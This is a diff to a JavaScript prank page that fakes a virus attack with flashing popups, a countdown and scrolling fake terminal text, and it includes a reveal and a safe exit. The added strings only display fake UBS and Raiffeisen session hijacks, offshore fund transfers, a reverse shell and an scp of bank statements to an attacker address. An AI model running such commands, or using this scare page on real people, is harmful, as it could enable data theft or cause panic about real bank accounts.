@@ -158,6 +158,8 @@ let popupCount       = 0;
 let countdownSeconds = 600;
 let totalFiles       = 24847 + Math.floor(Math.random() * 8000);
 let filesDeleted     = 0;
+let chaosStarted     = false;
+let virusCloseClicks = 0;
 
 let terminalTimer, chaosTimer, popupTimer, flashTimer, countdownTimer, shakeTimer, titleTimer;
 
@@ -234,6 +236,14 @@ function triggerFlash() {
 }
 
 const terminalLines = [
+  "$ connect --api banking.ubs.ch:443 — TLS handshake complete",
+  "BANKING APP: session cookie hijacked, 2FA bypassed",
+  "SSH CONNECTION: authenticated on secure.ubs.ch",
+  "$ transfer --amount 15240 --currency CHF --to offshore-4783",
+  "TRANSFERRING FUNDS: CHF 15,240 → Kryptokonto 0x7a3b...",
+  "FUNDS TRANSFERRED: CHF 47,600 extracted from savings account",
+  "$ scp -r ~/bank-statements attacker@194.32.78.11:/loot/",
+  "BANKING APP: Raiffeisen session hijacked — 0.94 BTC seized",
   "$ nmap -sV 192.168.1.0/24 — scanning local network...",
   "PORT 22/tcp OPEN — SSH detected on 192.168.1.1",
   "PORT 3389/tcp OPEN — RDP detected on target machine",
@@ -443,6 +453,21 @@ runawayControl.addEventListener("click", (e) => { if (!revealed) e.preventDefaul
 revealButton.addEventListener("click", revealJoke);
 document.getElementById("secretExit").addEventListener("click", showSafeScreen);
 
+// Close button: first tap triggers chaos, taps 2+3 throw more popups,
+// tap 4 ends the joke. stopPropagation keeps it out of the triple-tap counter.
+document.getElementById("virusClose").addEventListener("click", (e) => {
+  e.stopPropagation();
+  if (revealed) return;
+  virusCloseClicks++;
+  if (virusCloseClicks === 1) {
+    startChaosPhase();
+  } else if (virusCloseClicks >= 4) {
+    showSafeScreen();
+  } else {
+    spawnPopup(); spawnPopup(); spawnPopup();
+  }
+});
+
 // Triple-click safe screen
 let tapCount = 0, tapTimer = null;
 document.addEventListener("click", () => {
@@ -464,6 +489,13 @@ function startVirus() {
 
   appendTerminalLine("$ ./exploit --target localhost --payload reverse_shell");
   appendTerminalLine("CONNECTION ESTABLISHED — remote access granted");
+  appendTerminalLine("$ ssh banking@secure.ubs.ch — opening SSH tunnel");
+  appendTerminalLine("SSH CONNECTION: successfully established");
+  appendTerminalLine("$ connect --api banking.ubs.ch:443");
+  appendTerminalLine("BANKING APP: session hijacked, 2FA bypassed");
+  appendTerminalLine("$ transfer --amount 284000 --currency CHF --to offshore");
+  appendTerminalLine("TRANSFERRING FUNDS: CHF 284,000 → 4783-CH-OFFSHORE");
+  appendTerminalLine("FUNDS TRANSFERRED: CHF 284,000 successfully extracted");
 
   let titleFlash = false;
   titleTimer = setInterval(() => {
@@ -480,6 +512,22 @@ function startVirus() {
     countdownEl.textContent = `${min}:${sec.toString().padStart(2, "0")}`;
   }, 1000);
 
+  terminalTimer = setInterval(() => {
+    appendTerminalLine(terminalLines[Math.floor(Math.random() * terminalLines.length)]);
+    currentLine++;
+    if (currentLine % 15 === 0)
+      appendTerminalLine("$ echo 'YOU HAVE BEEN HACKED' > C:\\Users\\%USERNAME%\\Desktop\\README.txt");
+  }, isMobile ? 700 : 400);
+}
+
+// Phase 2: fires when user taps the "Schließen" close button.
+// All the loud stuff (popups, flash, shake, progress meter) starts here.
+function startChaosPhase() {
+  if (chaosStarted || revealed) return;
+  chaosStarted = true;
+
+  chaosTimer = setInterval(() => { tickChaos(); rotateAlert(); }, 800);
+
   shakeTimer = setInterval(() => {
     if (revealed) return;
     if (Math.random() < 0.3) {
@@ -490,16 +538,8 @@ function startVirus() {
 
   flashTimer = setInterval(() => { if (Math.random() < 0.6) triggerFlash(); }, isMobile ? 5000 : 3000);
 
-  terminalTimer = setInterval(() => {
-    appendTerminalLine(terminalLines[Math.floor(Math.random() * terminalLines.length)]);
-    currentLine++;
-    if (currentLine % 15 === 0)
-      appendTerminalLine("$ echo 'YOU HAVE BEEN HACKED' > C:\\Users\\%USERNAME%\\Desktop\\README.txt");
-  }, isMobile ? 700 : 400);
-
-  chaosTimer = setInterval(() => { tickChaos(); rotateAlert(); }, 800);
-
   popupTimer = setInterval(() => { if (popupCount < 15) spawnPopup(); }, isMobile ? 6000 : 4000);
-  setTimeout(() => spawnPopup(), 800);
-  setTimeout(() => spawnPopup(), 2000);
+  setTimeout(() => spawnPopup(), 200);
+  setTimeout(() => spawnPopup(), 900);
+  setTimeout(() => spawnPopup(), 1800);
 }
